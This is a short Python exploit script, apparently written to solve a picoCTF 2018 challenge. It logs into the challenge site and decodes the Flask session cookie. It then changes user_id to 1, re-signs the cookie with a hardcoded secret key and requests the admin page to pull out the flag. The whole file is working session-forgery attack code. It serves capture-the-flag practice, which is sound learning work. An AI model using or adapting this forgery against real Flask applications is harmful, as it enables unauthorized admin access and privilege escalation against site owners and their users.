#!/usr/bin/env python
import requests
import re
import zlib
from itsdangerous import base64_decode
from itsdangerous import base64_encode
import json

HOST = "2018shell3.picoctf.com"
PORT = "53588"
SECRET_KEY = "a155eb4e1743baef085ff6ecfed943f2"
USERNAME = 'bla'
PASSWORD = 'bla'

class FakeApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key

def exploit():
    client = requests.session()

    # Get csrf token
    r = client.get('http://{}:{}/login'.format(HOST, PORT))
    csrf_token = re.findall('(?<=value=").{10,}(?=">)', r.text)[0]
    # get session
    client.post('http://{}:{}/login'.format(HOST, PORT), data = {'username': USERNAME,'password': PASSWORD, 'csrf_token': csrf_token})
    session = client.cookies['session']  

    data = decode(session)
    data['user_id'] = 1
    data = encode(data)

    mod_session = {'session': data}
    client.cookies.clear()
    r = client.get('http://{}:{}/admin'.format(HOST, PORT), cookies=mod_session)
    print re.findall('picoCTF{.*}', r.text)[0]

def decode(session):
    # decode session and modify it
    session = session[1:] # get rid of first dot
    data = session.split(".")[0] # get data
    data = zlib.decompress(base64_decode(data)) # decode it
    data= json.loads(data)
    return data

def encode(data):
    from flask.sessions import SecureCookieSessionInterface
    # Dump back to string and encode
    app = FakeApp(SECRET_KEY)
    si = SecureCookieSessionInterface()
    s = si.get_signing_serializer(app)
    return s.dumps(data)

if __name__ == "__main__":
    exploit()
